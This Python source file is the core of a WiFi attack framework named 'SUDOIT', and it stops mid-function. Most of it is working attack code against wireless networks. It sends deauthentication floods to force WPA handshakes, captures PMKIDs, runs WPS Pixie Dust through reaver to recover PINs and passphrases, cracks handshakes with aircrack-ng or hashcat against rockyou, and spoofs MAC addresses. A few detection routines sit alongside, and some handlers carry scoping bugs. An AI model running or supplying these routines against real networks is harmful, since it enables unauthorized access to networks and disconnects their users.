#!/usr/bin/env python3
"""
SUDOIT Engine - Core Framework
Professional WiFi Penetration Testing Framework
Version: 1.0.0 | Ethical Use Only
"""

import os
import sys
import time
import json
import signal
import threading
import subprocess
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Any, Tuple

# Scapy imports
from scapy.all import (
    sniff, sendp, Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth,
    Dot11ProbeReq, Dot11ProbeResp, Dot11Auth, Dot11AssoReq,
    Dot11AssoResp, Dot11Disas, RadioTap, EAPOL, Raw,
    IP, TCP, UDP, ARP, Ether, conf
)

# Optional color support
try:
    from colorama import Fore, Style, init
    init(autoreset=True)
    COLOR = True
except ImportError:
    COLOR = False

# Framework imports
from core.database import DatabaseManager
from core.config import ConfigManager
from core.logger import setup_logging, get_logger

# Version
__version__ = "1.0.0"
__author__ = "Ethical Hacker Lab"
__license__ = "MIT (Educational Use Only)"

class bcolors:
    """Terminal colors for pretty output."""
    HEADER = '\033[95m' if not COLOR else Fore.MAGENTA
    BLUE = '\033[94m' if not COLOR else Fore.BLUE
    CYAN = '\033[96m' if not COLOR else Fore.CYAN
    GREEN = '\033[92m' if not COLOR else Fore.GREEN
    WARNING = '\033[93m' if not COLOR else Fore.YELLOW
    FAIL = '\033[91m' if not COLOR else Fore.RED
    ENDC = '\033[0m' if not COLOR else Style.RESET_ALL
    BOLD = '\033[1m' if not COLOR else Style.BRIGHT


class SUDOIT:
    """
    SUDOIT - Professional WiFi Penetration Testing Framework
    
    Features:
        - Advanced WiFi scanning with OUI fingerprinting
        - WPA/WPA2 handshake capture with automated deauth
        - PMKID attack support
        - WPS Pixie Dust attack
        - Evil twin & rogue AP detection
        - KARMA attack
        - Deauth & beacon flood detection
        - MAC spoofing & randomization
        - Cracking integration (aircrack-ng/hashcat)
        - SQLite session persistence
        - Web dashboard (Flask)
        - Multi-format reporting (JSON/HTML/PDF)
        - Plugin system
    """
    
    def __init__(self, config: Optional[Dict] = None):
        """Initialize SUDOIT framework."""
        # Load configuration
        self.config_manager = ConfigManager()
        self.config = self.config_manager.load_default()
        if config:
            self.config.update(config)
        
        # Interface setup
        self.iface = self.config.get("interface", "wlan0")
        self.mon_iface = self.config.get("monitor_interface", "wlan0mon")
        self.output_dir = Path(self.config.get("output_dir", "./output"))
        self.output_dir.mkdir(parents=True, exist_ok=True)
        
        # Logging
        self.logger = setup_logging(self.output_dir, self.config.get("log_level", "INFO"))
        self.logger.info(f"SUDOIT Framework v{__version__} initializing...")
        
        # Runtime state
        self.scan_results: Dict[str, Dict] = {}
        self.handshake_captured = False
        self.capture_file: Optional[str] = None
        self.running = False
        self.monitor_started = False
        self.current_channel = 1
        self.session_id: Optional[int] = None
        
        # Thread management
        self._threads: List[threading.Thread] = []
        self._lock = threading.Lock()
        
        # Database
        self.db = DatabaseManager(self.config.get("database_file", "sudoit_sessions.db"))
        
        # Module instances (lazy loaded)
        self._scanner = None
        self._handshake = None
        self._pmkid = None
        self._deauth_detector = None
        self._pixie = None
        self._evil_twin = None
        self._karma = None
        self._beacon_flood = None
        self._mac_spoof = None
        self._cracker = None
        self._reporter = None
        self._dashboard = None
        
        # Signal handling
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)
        
        # Display banner
        self._display_banner()
        
        self.logger.info("SUDOIT Framework initialized successfully")
    
    def _display_banner(self):
        """Display SUDOIT ASCII art banner."""
        banner = f"""
{bcolors.BOLD}{bcolors.CYAN}
 ██╗    ██╗██╗██████╗ ███████╗██╗     ███████╗███████╗███████╗
██║    ██║██║██╔══██╗██╔════╝██║     ██╔════╝██╔════╝██╔════╝
██║ █╗ ██║██║██████╔╝█████╗  ██║     █████╗  ███████╗███████╗
██║███╗██║██║██╔══██╗██╔══╝  ██║     ██╔══╝  ╚════██║╚════██║
╚███╔███╔╝██║██║  ██║███████╗███████╗███████╗███████║███████║
 ╚══╝╚══╝ ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚══════╝╚══════╝

██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗
██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
███████║███████║██║     █████╔╝ █████╗  ██████╔╝
██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ 
                                                                       
{bcolors.ENDC}
{bcolors.BOLD}   
╔══════════════════════════════════════════════════════════════════════════════╗
║               Professional Wireless Security Assessment Framework            ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  👨‍💻 Developer : h4cker_fawad                                                 ║
║  🏷 Version   : v{__version__:<56}                                           ║
║  🐧 Platform  : Kali Linux • Python 3.8+                                     ║
║  📡 Modules   : Scan • Handshake • PMKID • WPS • Reports • Dashboard         ║
║  ⚖ Purpose   : Authorized Wireless Security Testing Only                     ║
╚══════════════════════════════════════════════════════════════════════════════╝
{bcolors.ENDC}"""
        print(banner)
    
    # ==================== SIGNAL HANDLER ====================
    def _signal_handler(self, sig, frame):
        """Handle Ctrl+C for graceful shutdown."""
        print(f"\n{bcolors.WARNING}[!] Interrupt received. Shutting down...{bcolors.ENDC}")
        self.running = False
        self.cleanup_exit()
    
    # ==================== SYSTEM CHECKS ====================
    def check_root(self) -> bool:
        """Verify root privileges."""
        if os.geteuid() != 0:
            self.logger.critical("Root privileges required! Run with: sudo python3 sudoit.py")
            print(f"{bcolors.FAIL}[✗] Root privileges required!{bcolors.ENDC}")
            print(f"{bcolors.WARNING}    Run: sudo python3 sudoit.py{bcolors.ENDC}")
            sys.exit(1)
        self.logger.info("Root privileges confirmed")
        return True
    
    def check_dependencies(self) -> bool:
        """Verify all required system tools are installed."""
        print(f"{bcolors.CYAN}[*] Checking dependencies...{bcolors.ENDC}")
        
        required_tools = {
            "airmon-ng": "aircrack-ng",
            "airodump-ng": "aircrack-ng",
            "aireplay-ng": "aircrack-ng",
            "aircrack-ng": "aircrack-ng",
            "reaver": "reaver",
            "hcxdumptool": "hcxtools"
        }
        
        missing = []
        for tool, package in required_tools.items():
            if subprocess.run(["which", tool], capture_output=True).returncode != 0:
                missing.append(f"{tool} (apt install {package})")
        
        if missing:
            print(f"{bcolors.FAIL}[✗] Missing dependencies:{bcolors.ENDC}")
            for m in missing:
                print(f"    - {m}")
            self.logger.error(f"Missing dependencies: {missing}")
            return False
        
        print(f"{bcolors.GREEN}[✓] All dependencies satisfied{bcolors.ENDC}")
        self.logger.info("All dependencies satisfied")
        return True
    
    # ==================== MONITOR MODE ====================
    def start_monitor_mode(self) -> bool:
        """Enable monitor mode on wireless interface."""
        if self.monitor_started:
            self.logger.info("Monitor mode already active")
            return True
        
        print(f"{bcolors.CYAN}[*] Enabling monitor mode on {self.iface}...{bcolors.ENDC}")
        self.logger.info(f"Starting monitor mode on {self.iface}")
        
        try:
            # Kill conflicting processes
            subprocess.run(["airmon-ng", "check", "kill"], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Start monitor mode
            result = subprocess.run(["airmon-ng", "start", self.iface], 
                                  capture_output=True, text=True)
            
            if result.returncode != 0:
                raise Exception(result.stderr)
            
            # Detect monitor interface
            self.mon_iface = self._detect_monitor_interface()
            if not self.mon_iface:
                self.mon_iface = self.iface + "mon"
            
            print(f"{bcolors.GREEN}[✓] Monitor mode active: {self.mon_iface}{bcolors.ENDC}")
            self.logger.info(f"Monitor interface: {self.mon_iface}")
            self.monitor_started = True
            
            # MAC randomization if enabled
            if self.config.get("mac_randomization", False):
                self._randomize_mac()
            
            return True
            
        except Exception as e:
            print(f"{bcolors.FAIL}[✗] Failed to start monitor mode: {e}{bcolors.ENDC}")
            self.logger.error(f"Monitor mode failed: {e}")
            return False
    
    def _detect_monitor_interface(self) -> Optional[str]:
        """Auto-detect the monitor interface name."""
        try:
            result = subprocess.run(["iwconfig"], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if "Mode:Monitor" in line:
                    return line.split()[0]
        except Exception:
            pass
        return None
    
    def _randomize_mac(self):
        """Randomize MAC address of monitor interface."""
        import random
        new_mac = ":".join(f"{random.randint(0,255):02x}" for _ in range(6))
        subprocess.run(["ifconfig", self.mon_iface, "down"], capture_output=True)
        subprocess.run(["macchanger", "-m", new_mac, self.mon_iface], capture_output=True)
        subprocess.run(["ifconfig", self.mon_iface, "up"], capture_output=True)
        self.logger.info(f"MAC randomized to {new_mac}")
    
    def stop_monitor_mode(self):
        """Restore managed mode."""
        if self.monitor_started:
            print(f"{bcolors.CYAN}[*] Stopping monitor mode...{bcolors.ENDC}")
            subprocess.run(["airmon-ng", "stop", self.mon_iface], capture_output=True)
            subprocess.run(["systemctl", "restart", "NetworkManager"], capture_output=True)
            self.monitor_started = False
            print(f"{bcolors.GREEN}[✓] Monitor mode stopped{bcolors.ENDC}")
            self.logger.info("Monitor mode stopped")
    
    def set_channel(self, channel: int):
        """Set monitor interface to specific channel."""
        subprocess.run(["iwconfig", self.mon_iface, "channel", str(channel)], 
                      capture_output=True)
        self.current_channel = channel

    # ==================== SCAN NETWORKS ====================
    def scan_networks(self, duration: int = 60, channel_hop: bool = True) -> Dict[str, Dict]:
        """
        Scan for WiFi networks with channel hopping.
        
        Args:
            duration: Scan duration in seconds
            channel_hop: Enable channel hopping for wider coverage
        
        Returns:
            Dictionary of BSSID -> network info
        """
        print(f"\n{bcolors.CYAN}[*] Starting WiFi scan ({duration}s)...{bcolors.ENDC}")
        print(f"{bcolors.CYAN}[*] Press Ctrl+C to stop early{bcolors.ENDC}\n")
        
        if not self.start_monitor_mode():
            return {}
        
        self.scan_results.clear()
        self.running = True
        networks_found = 0
        
        def packet_handler(pkt):
            if not self.running:
                return
            try:
                if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                    bssid = pkt[Dot11].addr2
                    if not bssid:
                        return
                    
                    # Extract SSID
                    ssid = "<Hidden>"
                    if pkt.haslayer(Dot11Elt) and pkt[Dot11Elt].info:
                        try:
                            ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
                            if not ssid:
                                ssid = "<Hidden>"
                        except:
                            pass
                    
                    # Extract channel
                    channel = None
                    elt = pkt.getlayer(Dot11Elt)
                    while elt:
                        if elt.ID == 3:  # DS Parameter Set
                            try:
                                channel = ord(elt.info)
                            except:
                                pass
                            break
                        elt = elt.payload.getlayer(Dot11Elt) if elt.payload else None
                    
                    # Encryption detection
                    encryption = self._detect_encryption(pkt)
                    
                    # Signal strength
                    signal_strength = -100
                    if pkt.haslayer(RadioTap):
                        signal_strength = pkt[RadioTap].dBm_AntSignal
                    
                    # Vendor lookup
                    vendor = self._get_vendor(bssid)
                    
                    if bssid not in self.scan_results:
                        networks_found += 1
                        self.scan_results[bssid] = {
                            "ssid": ssid,
                            "bssid": bssid,
                            "channel": channel or 0,
                            "encryption": encryption,
                            "signal": signal_strength,
                            "vendor": vendor,
                            "first_seen": datetime.now().isoformat(),
                            "last_seen": datetime.now().isoformat()
                        }
                        
                        # Save to database
                        if self.session_id:
                            self.db.add_network(
                                self.session_id, bssid, ssid,
                                channel or 0, encryption,
                                signal_strength, vendor
                            )
                        
                        # Print discovery
                        enc_color = bcolors.GREEN if encryption == "OPEN" else \
                                   bcolors.WARNING if "WPA" in encryption else bcolors.FAIL
                        print(f"  [{enc_color}{encryption:<6}{bcolors.ENDC}] "
                              f"{bcolors.BOLD}{ssid:<25}{bcolors.ENDC} "
                              f"{bssid:<20} Ch:{str(channel or '?'):>3} "
                              f"Signal:{signal_strength:>4}dBm")
                    else:
                        # Update existing
                        self.scan_results[bssid]["signal"] = signal_strength
                        self.scan_results[bssid]["last_seen"] = datetime.now().isoformat()
                        if self.session_id:
                            self.db.update_network_signal(bssid, signal_strength)
                            
            except Exception as e:
                self.logger.debug(f"Packet parse error: {e}")
        
        # Start channel hopper thread
        hopper = None
        if channel_hop:
            hopper = threading.Thread(target=self._channel_hopper, daemon=True)
            hopper.start()
        
        # Start sniffing
        try:
            sniff(iface=self.mon_iface, prn=packet_handler, store=0, timeout=duration)
        except Exception as e:
            self.logger.error(f"Scan error: {e}")
            print(f"{bcolors.FAIL}[✗] Scan failed: {e}{bcolors.ENDC}")
        finally:
            self.running = False
            if hopper:
                hopper.join(timeout=1)
        
        print(f"\n{bcolors.GREEN}[✓] Scan complete: {len(self.scan_results)} networks found{bcolors.ENDC}")
        return self.scan_results
    
    def _channel_hopper(self):
        """Hop through channels for comprehensive scanning."""
        channels_24ghz = list(range(1, 14))
        channels_5ghz = [36, 40, 44, 48, 149, 153, 157, 161, 165]
        all_channels = channels_24ghz + channels_5ghz
        
        while self.running:
            for ch in all_channels:
                if not self.running:
                    break
                try:
                    subprocess.run(
                        ["iwconfig", self.mon_iface, "channel", str(ch)],
                        capture_output=True, timeout=0.3
                    )
                    self.current_channel = ch
                except:
                    pass
                time.sleep(self.config.get("channel_hop_interval", 0.3))
    
    def _detect_encryption(self, pkt) -> str:
        """Determine WIFI encryption type from packet."""
        try:
            cap = pkt[Dot11].cap
            has_rsn = False
            
            elt = pkt.getlayer(Dot11Elt)
            while elt:
                if elt.ID == 48:  # RSN (WPA2)
                    has_rsn = True
                    break
                elt = elt.payload.getlayer(Dot11Elt) if elt.payload else None
            
            if cap & 0x0010:  # Privacy bit set
                return "WPA2" if has_rsn else "WPA"
            return "OPEN"
        except:
            return "Unknown"
    
    def _get_vendor(self, bssid: str) -> str:
        """Look up vendor by OUI prefix."""
        OUI_DB = {
            "00036C": "Cisco", "001377": "Samsung", "080030": "NETGEAR",
            "001D7E": "TP-Link", "00A0C5": "D-Link", "DC9FDB": "Ubiquiti",
            "FCA621": "Apple", "B827EB": "Raspberry Pi", "E8DE27": "Microsoft",
            "ACF1DF": "Google", "4CEBB7": "Amazon", "74258A": "OnePlus",
            "60A4B7": "Xiaomi", "38229D": "LG", "003065": "Huawei"
        }
        oui = bssid.replace(":", "").upper()[:6]
        return OUI_DB.get(oui, "Unknown")
    
    # ==================== HANDSHAKE CAPTURE ====================
    def capture_handshake(self, target_bssid: str, channel: int,
                          output_prefix: Optional[str] = None,
                          deauth: bool = True) -> Optional[str]:
        """
        Capture WPA/WPA2 4-way handshake.
        
        Args:
            target_bssid: Target AP MAC address
            channel: Channel to listen on
            output_prefix: Prefix for capture files
            deauth: Send deauth packets to force handshake
        
        Returns:
            Path to capture file or None if failed
        """
        print(f"\n{bcolors.CYAN}[*] Starting handshake capture...{bcolors.ENDC}")
        print(f"    Target: {target_bssid}")
        print(f"    Channel: {channel}")
        
        if not self.start_monitor_mode():
            return None
        
        if not output_prefix:
            output_prefix = str(self.output_dir / f"handshake_{target_bssid.replace(':', '')}")
        
        self.set_channel(channel)
        self.capture_file = f"{output_prefix}-01.cap"
        self.handshake_captured = False
        
        # Start airodump-ng
        print(f"{bcolors.CYAN}[*] Starting packet capture...{bcolors.ENDC}")
        dump_cmd = [
            "airodump-ng", "-c", str(channel),
            "--bssid", target_bssid,
            "-w", output_prefix,
            self.mon_iface
        ]
        dump_proc = subprocess.Popen(dump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2)
        
        # Deauth attack
        deauth_proc = None
        if deauth:
            print(f"{bcolors.WARNING}[*] Sending deauth packets...{bcolors.ENDC}")
            deauth_count = self.config.get("deauth_count", 15)
            deauth_cmd = [
                "aireplay-ng", "-0", str(deauth_count),
                "-a", target_bssid,
                self.mon_iface
            ]
            deauth_proc = subprocess.Popen(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Wait for handshake
        print(f"{bcolors.CYAN}[*] Waiting for handshake...{bcolors.ENDC}")
        handshake_found = False
        timeout = time.time() + self.config.get("timeout", 60)
        
        while time.time() < timeout and not handshake_found:
            time.sleep(3)
            csv_file = f"{output_prefix}-01.csv"
            if os.path.isfile(csv_file):
                try:
                    with open(csv_file, 'r') as f:
                        content = f.read()
                        if "WPA Handshake" in content or "EAPOL" in content:
                            handshake_found = True
                            self.handshake_captured = True
                            print(f"{bcolors.GREEN}[✓] Handshake captured!{bcolors.ENDC}")
                            print(f"    File: {self.capture_file}")
                            
                            if self.session_id:
                                net_id = self.db.get_network_id_by_bssid(target_bssid)
                                if net_id:
                                    self.db.add_handshake(net_id, self.capture_file)
                except:
                    pass
        
        # Cleanup
        if deauth_proc:
            deauth_proc.terminate()
        dump_proc.terminate()
        time.sleep(1)
        subprocess.run(["pkill", "-f", "airodump-ng"], capture_output=True)
        
        if not handshake_found:
            print(f"{bcolors.FAIL}[✗] No handshake captured within timeout{bcolors.ENDC}")
            return None
        
        return self.capture_file
    
    # ==================== PMKID ATTACK ====================
    def pmkid_attack(self, target_bssid: Optional[str] = None, timeout: int = 120) -> Optional[str]:
        """Attempt PMKID capture using hcxdumptool."""
        print(f"\n{bcolors.CYAN}[*] Starting PMKID attack...{bcolors.ENDC}")
        
        if not self.start_monitor_mode():
            return None
        
        pcapng_file = self.output_dir / f"pmkid_{datetime.now():%Y%m%d_%H%M%S}.pcapng"
        cmd = ["hcxdumptool", "-o", str(pcapng_file), "-i", self.mon_iface, "--enable_status=1"]
        
        if target_bssid:
            cmd.extend(["--filterlist_ap", target_bssid])
            print(f"    Target: {target_bssid}")
        
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            start = time.time()
            
            while time.time() - start < timeout:
                line = proc.stdout.readline()
                if not line:
                    break
                if "PMKID" in line:
                    print(f"{bcolors.GREEN}[✓] PMKID captured!{bcolors.ENDC}")
                    print(f"    File: {pcapng_file}")
                    proc.terminate()
                    return str(pcapng_file)
            
            proc.terminate()
            print(f"{bcolors.FAIL}[✗] No PMKID found within timeout{bcolors.ENDC}")
        except Exception as e:
            self.logger.error(f"PMKID attack error: {e}")
            print(f"{bcolors.FAIL}[✗] PMKID attack failed: {e}{bcolors.ENDC}")
        
        return None
    
    # ==================== DEAUTH DETECTION ====================
    def detect_deauth(self, threshold: int = 10, interval: int = 5, duration: int = 0) -> Dict[str, int]:
        """
        Detect deauthentication flood attacks.
        
        Returns:
            Dict of attacker MAC -> packet count
        """
        print(f"\n{bcolors.CYAN}[*] Monitoring for deauth attacks...{bcolors.ENDC}")
        print(f"    Threshold: {threshold} packets/{interval}s")
        
        if not self.start_monitor_mode():
            return {}
        
        self.running = True
        deauth_counter = {}
        attacks_detected = {}
        last_reset = time.time()
        
        def handler(pkt):
            if not self.running:
                return
            if pkt.haslayer(Dot11Deauth):
                attacker = pkt[Dot11].addr2
                deauth_counter[attacker] = deauth_counter.get(attacker, 0) + 1
                
                current = time.time()
                if current - last_reset >= interval:
                    for addr, cnt in deauth_counter.items():
                        if cnt >= threshold:
                            print(f"{bcolors.WARNING}[!] Deauth attack from {addr}: {cnt} packets{bcolors.ENDC}")
                            attacks_detected[addr] = cnt
                    deauth_counter.clear()
                    last_reset = current
        
        try:
            sniff(iface=self.mon_iface, prn=handler, store=0, timeout=duration if duration else None)
        except Exception as e:
            self.logger.error(f"Deauth detection error: {e}")
        finally:
            self.running = False
        
        if not attacks_detected:
            print(f"{bcolors.GREEN}[✓] No deauth attacks detected{bcolors.ENDC}")
        
        return attacks_detected
    
    # ==================== WPS PIXIE DUST ====================
    def wps_pixie_attack(self, target_bssid: str, channel: int) -> bool:
        """Attempt WPS Pixie Dust attack using reaver."""
        print(f"\n{bcolors.CYAN}[*] Starting WPS Pixie Dust attack...{bcolors.ENDC}")
        print(f"    Target: {target_bssid}")
        print(f"    Channel: {channel}")
        
        if not self.start_monitor_mode():
            return False
        
        self.set_channel(channel)
        output_file = self.output_dir / f"wps_{target_bssid.replace(':', '')}"
        
        cmd = [
            "reaver", "-i", self.mon_iface,
            "-b", target_bssid,
            "-c", str(channel),
            "-K", "1",  # Pixie Dust mode
            "-vv",
            "-o", str(output_file)
        ]
        
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            start = time.time()
            timeout = self.config.get("wps_pixie_timeout", 120)
            
            while time.time() - start < timeout:
                line = proc.stdout.readline()
                if not line:
                    break
                    
                if "WPS PIN:" in line:
                    pin = line.split("WPS PIN:")[1].strip()
                    print(f"{bcolors.GREEN}[✓] WPS PIN recovered: {pin}{bcolors.ENDC}")
                    proc.terminate()
                    return True
                    
                if "WPA PSK:" in line:
                    psk = line.split("WPA PSK:")[1].strip()
                    print(f"{bcolors.GREEN}[✓] WPA PSK cracked: {psk}{bcolors.ENDC}")
                    proc.terminate()
                    return True
            
            proc.terminate()
            print(f"{bcolors.FAIL}[✗] WPS attack failed within timeout{bcolors.ENDC}")
        except Exception as e:
            self.logger.error(f"Pixie Dust error: {e}")
            print(f"{bcolors.FAIL}[✗] Pixie Dust error: {e}{bcolors.ENDC}")
        
        return False

    
    # ==================== EVIL TWIN DETECTION ====================
    def detect_evil_twin(self, legitimate_ssid: str, legitimate_bssid: Optional[str] = None,
                         duration: int = 60) -> List[Dict]:
        """Detect rogue APs spoofing a legitimate SSID."""
        print(f"\n{bcolors.CYAN}[*] Monitoring for evil twin of '{legitimate_ssid}'...{bcolors.ENDC}")
        
        if not self.start_monitor_mode():
            return []
        
        rogue_aps = []
        
        def handler(pkt):
            if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                try:
                    ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore') if pkt[Dot11Elt].info else ""
                    bssid = pkt[Dot11].addr2
                    
                    if ssid == legitimate_ssid:
                        if not legitimate_bssid or bssid.lower() != legitimate_bssid.lower():
                            if bssid not in [ap['bssid'] for ap in rogue_aps]:
                                rogue_aps.append({
                                    "bssid": bssid,
                                    "ssid": ssid,
                                    "time": datetime.now().isoformat()
                                })
                                print(f"{bcolors.WARNING}[!] Evil twin detected: {bssid}{bcolors.ENDC}")
                except:
                    pass
        
        sniff(iface=self.mon_iface, prn=handler, store=0, timeout=duration)
        
        if rogue_aps:
            print(f"{bcolors.WARNING}[!] Total rogue APs: {len(rogue_aps)}{bcolors.ENDC}")
        else:
            print(f"{bcolors.GREEN}[✓] No evil twin detected{bcolors.ENDC}")
        
        return rogue_aps
    
    # ==================== KARMA ATTACK ====================
    def karma_attack(self, duration: int = 120):
        """KARMA attack - respond to all probe requests."""
        print(f"\n{bcolors.CYAN}[*] Starting KARMA attack ({duration}s)...{bcolors.ENDC}")
        
        if not self.start_monitor_mode():
            return
        
        self.running = True
        probes_seen = set()
        
        def handler(pkt):
            if not self.running:
                return
            if pkt.haslayer(Dot11ProbeReq):
                try:
                    ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore') if pkt[Dot11Elt].info else ""
                    if ssid and ssid not in probes_seen:
                        probes_seen.add(ssid)
                        print(f"  [*] Probe request: {ssid}")
                except:
                    pass
        
        sniff(iface=self.mon_iface, prn=handler, store=0, timeout=duration)
        self.running = False
        print(f"{bcolors.GREEN}[✓] KARMA complete: {len(probes_seen)} unique probes{bcolors.ENDC}")
    
    # ==================== BEACON FLOOD DETECTION ====================
    def detect_beacon_flood(self, threshold: int = 50, interval: int = 10) -> List[str]:
        """Detect excessive beacon frames indicating flood attack."""
        print(f"\n{bcolors.CYAN}[*] Beacon flood detection (> {threshold}/{interval}s)...{bcolors.ENDC}")
        
        if not self.start_monitor_mode():
            return []
        
        self.running = True
        beacon_count = {}
        last_reset = time.time()
        flood_sources = []
        
        def handler(pkt):
            if not self.running:
                return
            if pkt.haslayer(Dot11Beacon):
                bssid = pkt[Dot11].addr2
                beacon_count[bssid] = beacon_count.get(bssid, 0) + 1
                
                if time.time() - last_reset >= interval:
                    for addr, cnt in beacon_count.items():
                        if cnt > threshold:
                            print(f"{bcolors.WARNING}[!] Beacon flood: {addr} ({cnt} beacons){bcolors.ENDC}")
                            flood_sources.append(addr)
                    beacon_count.clear()
                    last_reset = time.time()
        
        sniff(iface=self.mon_iface, prn=handler, store=0, timeout=30)
        self.running = False
        
        if not flood_sources:
            print(f"{bcolors.GREEN}[✓] No beacon flood detected{bcolors.ENDC}")
        
        return list(set(flood_sources))
    
    # ==================== MAC SPOOFING ====================
    def spoof_mac(self, new_mac: Optional[str] = None):
        """Change MAC address of monitor interface."""
        if not self.monitor_started:
            self.start_monitor_mode()
        
        if not new_mac:
            import random
            new_mac = ":".join(f"{random.randint(0,255):02x}" for _ in range(6))
        
        print(f"{bcolors.CYAN}[*] Changing MAC to {new_mac}...{bcolors.ENDC}")
        subprocess.run(["ifconfig", self.mon_iface, "down"], capture_output=True)
        subprocess.run(["macchanger", "-m", new_mac, self.mon_iface], capture_output=True)
        subprocess.run(["ifconfig", self.mon_iface, "up"], capture_output=True)
        print(f"{bcolors.GREEN}[✓] MAC changed to {new_mac}{bcolors.ENDC}")
        self.logger.info(f"MAC spoofed to {new_mac}")
    
    # ==================== CRACKING ====================
    def crack_handshake(self, capture_file: str, wordlist: Optional[str] = None,
                        use_hashcat: bool = False) -> Optional[str]:
        """Crack WPA handshake using aircrack-ng or hashcat."""
        if not os.path.isfile(capture_file):
            print(f"{bcolors.FAIL}[✗] Capture file not found{bcolors.ENDC}")
            return None
        
        wl = wordlist or self.config.get("wordlist", "/usr/share/wordlists/rockyou.txt")
        if not os.path.isfile(wl):
            print(f"{bcolors.FAIL}[✗] Wordlist not found: {wl}{bcolors.ENDC}")
            return None
        
        print(f"{bcolors.CYAN}[*] Starting crack...{bcolors.ENDC}")
        print(f"    File: {capture_file}")
        print(f"    Wordlist: {wl}")
        
        if use_hashcat:
            cmd = ["hashcat", "-m", "22000", capture_file, wl, "--force"]
        else:
            cmd = ["aircrack-ng", "-w", wl, capture_file]
        
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            stdout, _ = proc.communicate(timeout=300)
            
            if "KEY FOUND" in stdout:
                for line in stdout.split('\n'):
                    if "KEY FOUND" in line:
                        key = line.split(':')[-1].strip()
                        print(f"{bcolors.GREEN}[✓] PSK cracked: {key}{bcolors.ENDC}")
                        return key
        except subprocess.TimeoutExpired:
            proc.kill()
        
        print(f"{bcolors.FAIL}[✗] No key found{bcolors.ENDC}")
        return None
    
    # ==================== SESSION MANAGEMENT ====================
    def new_session(self, name: str = "", description: str = ""):
        """Create a new assessment session."""
        self.session_id = self.db.create_session(name, description)
        print(f"{bcolors.GREEN}[✓] Session {self.session_id} created{bcolors.ENDC}")
        self.logger.info(f"New session: {self.session_id}")
    
    def close_session(self):
        """Close current session."""
        if self.session_id:
            self.db.close_session(self.session_id)
            print(f"{bcolors.GREEN}[✓] Session {self.session_id} closed{bcolors.ENDC}")
            self.logger.info(f"Session {self.session_id} closed")
    
    # ==================== DISPLAY ====================
    def show_scan_results(self):
        """Display scan results in formatted table."""
        if not self.scan_results:
            print(f"{bcolors.WARNING}[!] No scan results. Run scan first.{bcolors.ENDC}")
            return
        
        print(f"\n{bcolors.HEADER}{'='*80}{bcolors.ENDC}")
        print(f"{bcolors.BOLD}{'SSID':<25} {'BSSID':<20} {'Ch':>3} {'Enc':<8} {'Signal':>7} {'Vendor':<15}{bcolors.ENDC}")
        print(f"{bcolors.HEADER}{'='*80}{bcolors.ENDC}")
        
        for bssid, info in sorted(self.scan_results.items(), key=lambda x: x[1]['signal'], reverse=True):
            enc = info.get('encryption', '?')
            enc_color = bcolors.GREEN if enc == "OPEN" else bcolors.WARNING if "WPA" in enc else bcolors.FAIL
            
            print(f"{info.get('ssid', '?'):<25} "
                  f"{bssid:<20} "
                  f"{info.get('channel', '?'):>3} "
                  f"{enc_color}{enc:<8}{bcolors.ENDC} "
                  f"{info.get('signal', -100):>6}dBm "
                  f"{info.get('vendor', '?')[:14]:<15}")
        
        print(f"{bcolors.HEADER}{'='*80}{bcolors.ENDC}")
        print(f"{bcolors.CYAN}Total: {len(self.scan_results)} networks{bcolors.ENDC}\n")
    
    def show_status(self):
        """Display current framework status."""
        print(f"\n{bcolors.BOLD}═══ SUDOIT Status ═══{bcolors.ENDC}")
        print(f"  Version:    {__version__}")
        print(f"  Interface:  {self.iface}")
        print(f"  Monitor:    {self.mon_iface} ({'Active' if self.monitor_started else 'Inactive'})")
        print(f"  Channel:    {self.current_channel}")
        print(f"  Session:    {self.session_id or 'None'}")
        print(f"  Networks:   {len(self.scan_results)}")
        print(f"  Running:    {'Yes' if self.running else 'No'}")
        print()
    
    # ==================== CLEANUP ====================
    def cleanup_exit(self):
        """Clean shutdown of framework."""
        print(f"\n{bcolors.CYAN}[*] Cleaning up...{bcolors.ENDC}")
        
        self.running = False
        
        # Close session
        if self.session_id:
            self.close_session()
        
        # Stop monitor mode
        if self.config.get("cleanup_exit", True):
            self.stop_monitor_mode()
        
        # Close database
        self.db.close()
        
        print(f"{bcolors.GREEN}[✓] Shutdown complete. Goodbye!{bcolors.ENDC}")
        sys.exit(0)


# ==================== MODULE IMPORTS (Lazy Loading) ====================
# These will be implemented when modules are created
def get_scanner():
    """Lazy load scanner module."""
    if not hasattr(get_scanner, '_instance'):
        from modules.scanner import WiFiScanner
        get_scanner._instance = WiFiScanner
    return get_scanner._instance

def get_handshake():
    """Lazy load handshake module."""
    if not hasattr(get_handshake, '_instance'):
        from modules.handshake import HandshakeCapture
        get_handshake._instance = HandshakeCapture
    return get_handshake._instance

def get_pmkid():
    """Lazy load PMKID module."""
    if not hasattr(get_pmkid, '_instance'):
        from modules.pmkid import PMKIDAttack
        get_pmkid._instance = PMKIDAttack
    return get_pmkid._instance

def get_deauth_detector():
    """Lazy load deauth detector module."""
